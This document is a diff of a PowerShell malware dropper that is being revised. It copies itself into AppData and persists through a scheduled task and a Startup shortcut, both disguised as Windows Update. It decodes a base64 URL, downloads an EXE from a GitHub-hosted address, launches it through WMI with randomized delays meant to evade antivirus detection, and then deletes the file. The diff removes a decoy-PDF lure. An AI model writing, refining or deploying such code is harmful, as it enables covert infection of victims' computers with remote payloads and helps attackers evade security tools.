@@ -1,6 +1,6 @@
 $ErrorActionPreference = 'SilentlyContinue'
 
-# === SELF-PRESERVATION: Ensure script is saved to disk ===
+# === SELF-PRESERVATION ===
 $localPath = "$env:APPDATA\Microsoft\Windows\Caches\launcher.ps1"
 $currentPath = $MyInvocation.MyCommand.Path
 
@@ -22,7 +22,7 @@ function Save-ScriptToDisk {
 }
 $scriptPath = Save-ScriptToDisk -Destination $localPath
 
-# === PERSISTENCE: Scheduled Task (primary) ===
+# === PERSISTENCE: Scheduled Task ===
 $taskName = "WindowsUpdateTask"
 $taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
 if (-not $taskExists) {
@@ -37,7 +37,7 @@ if (-not $taskExists) {
     } catch {}
 }
 
-# === PERSISTENCE: Startup Folder LNK (backup) ===
+# === PERSISTENCE: Startup Folder LNK ===
 $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 $lnkPath = "$startupPath\WindowsUpdateHelper.lnk"
 if (-not (Test-Path $lnkPath)) {
@@ -49,41 +49,25 @@ if (-not (Test-Path $lnkPath)) {
     $shortcut.Save()
 }
 
-# === MAIN PAYLOAD: Download and execute with evasion ===
-Start-Sleep -Seconds (Get-Random -Min 2 -Max 8)
-Start-Sleep -Seconds (Get-Random -Min 20 -Max 30)
+# === BEARFOOS EVASION: Delay before EXE ===
+Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)
 
+# === DOWNLOAD AND EXECUTE PAYLOAD ===
 $cache = "$env:APPDATA\Microsoft\Windows\Caches"
 if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }
 
-# === FIRST-RUN FLAG (Prevents PDF from opening on every reboot) ===
-$flagFile = "$cache\installed.flag"
-$isFirstRun = -not (Test-Path $flagFile)
-
-# Base64-encoded URLs (88 KB compressed PDF + new EXE)
-$pdfUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWthel9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LTQucGRm'))
 $exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9XaW5kb3dzVXBkYXRlSGVscGVyLmV4ZQ=='))
-$pdfPath = "$cache\Nakaz_No._661_vid_02.03.2026-4.pdf"
 $exePath = "$cache\WindowsUpdateHelper.exe"
 
 $headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'}
 
-# Download PDF (only on first run, and only if missing)
-if ($isFirstRun -and -not (Test-Path $pdfPath)) {
-    try {
-        Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing
-    } catch {}
-}
-
-Start-Sleep -Milliseconds (Get-Random -Min 1500 -Max 4000)
-
-# Download EXE (only if missing, with retry)
+# Download EXE with retry
 if (-not (Test-Path $exePath)) {
     $retryCount = 0
     $maxRetries = 3
     do {
         try {
-            Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing
+            (New-Object System.Net.WebClient).DownloadFile($exeUrl, $exePath)
             break
         } catch {
             $retryCount++
@@ -92,17 +76,7 @@ if (-not (Test-Path $exePath)) {
     } while ($retryCount -lt $maxRetries)
 }
 
-# Open PDF decoy ONLY on first run (user-triggered via LNK)
-if ($isFirstRun -and (Test-Path $pdfPath)) {
-    try { Start-Process $pdfPath } catch {}
-    # Create flag to prevent future PDF openings
-    New-Item -Path $flagFile -ItemType File -Force | Out-Null
-}
-
-# Long delay before launching EXE
-Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)
-
-# Launch EXE using WMI process creation
+# Launch EXE
 if (Test-Path $exePath) {
     try {
         $wmiParams = @{
@@ -120,10 +94,9 @@ if (Test-Path $exePath) {
     }
 }
 
-# Cleanup after 5 minutes
+# Cleanup EXE after 5 minutes
 Start-Job -ScriptBlock {
-    param($exe, $pdf)
+    param($exe)
     Start-Sleep -Seconds 300
     Remove-Item -Path $exe -Force -ErrorAction SilentlyContinue
-    Remove-Item -Path $pdf -Force -ErrorAction SilentlyContinue
-} -ArgumentList $exePath, $pdfPath | Out-Null
+} -ArgumentList $exePath | Out-Null
